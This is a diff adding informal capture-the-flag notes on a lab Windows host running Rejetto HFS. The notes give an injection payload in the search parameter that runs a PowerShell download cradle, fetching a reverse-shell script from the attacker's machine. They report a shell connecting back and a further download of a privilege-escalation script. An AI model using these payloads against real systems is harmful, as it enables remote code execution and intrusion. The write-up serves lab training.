@@ -10,4 +10,22 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 
+default rejetto scipts dont work
 
+`http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.10.}`
+
+[](./rev.ps1)
+
+http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.19:8000/rev.ps1').}
+
+![](20230217135239.png)  
+
+got a connect back
+
+privilege escalations
+
+IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.19:8000/ms16-32.ps1')
+
+but ms 16 32 didnot wokr
+
+need to donwload sherlock first
